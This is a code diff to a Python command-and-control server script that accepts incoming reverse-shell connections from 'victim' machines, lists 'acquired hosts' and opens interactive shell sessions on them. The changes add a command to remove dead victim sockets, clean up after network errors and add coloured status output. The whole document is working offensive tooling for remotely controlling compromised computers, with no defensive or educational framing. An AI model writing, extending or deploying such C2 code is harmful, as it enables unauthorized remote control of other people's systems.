@@ -34,10 +34,11 @@ def help():
 
     print('''
                 Available Commands:
-                                    help:show this help menu
-                                    list:list acquired hosts
-                                    use <index>:open a shell session with a host
-                                    quit:exit the program
+                                    help:Show this help menu.
+                                    list:Lists connected hosts, along with the session id.
+                                    use <id>:Open a shell session with a selected host.
+                                    quit:Exit the program.
+                                    remove <id>:Forcibly removes a dead socket(Do Not try on live connections!)
                 ''')
 
 def colored(r, g, b, text):
@@ -61,7 +62,7 @@ def listener():
     victim_sockets.append(client_socket)
     victim_address.append(client_address)
     victim_host.append(host)
-    print("\n[+]Acquired new host:"+ host+" , "+client_address[0]+":"+str(client_address[1]))
+    print(Style.BRIGHT + Fore.CYAN+"\n[+]Acquired new host:"+ host+" , "+client_address[0]+":"+str(client_address[1])+Style.RESET_ALL)
     #print(f"{client_address[0]}:{client_address[1]} Connected!")
 
 def listhosts():
@@ -80,7 +81,15 @@ def C2():
             if (CMD.split())[0] == "use":
                 index = int((CMD.split())[1])
                 shell = True
-                
+            if(CMD.split())[0] == "remove":
+                index = int((CMD.split())[1])
+                try:
+                    victim_sockets[index].close()
+                except:
+                    None
+                victim_sockets.remove(victim_sockets[index])
+                victim_address.remove(victim_address[index])
+                victim_host.remove(victim_host[index])    
             elif CMD == "quit":
                 exit()
                 
@@ -103,6 +112,10 @@ def C2():
                     print('\n'+output)
                 except:
                     print("[!]Network error.Target is offline")
+                    victim_sockets.remove(victim_sockets[index])
+                    victim_address.remove(victim_address[index])
+                    victim_host.remove(victim_host[index])
+                    break
                 if CMD == "exit":
                     victim_sockets.remove(victim_sockets[index])
                     victim_address.remove(victim_address[index])
@@ -114,8 +127,11 @@ def C2():
 
 print_banner()
 help()
+print(Style.BRIGHT + Fore.CYAN+"[+]Listening for connections on "+SERVER_HOST+":"+str(SERVER_PORT) + Style.RESET_ALL)
 while True:
     thread = threading.Thread(target=C2,args=())
     thread.start()
     listener()
+
+
 
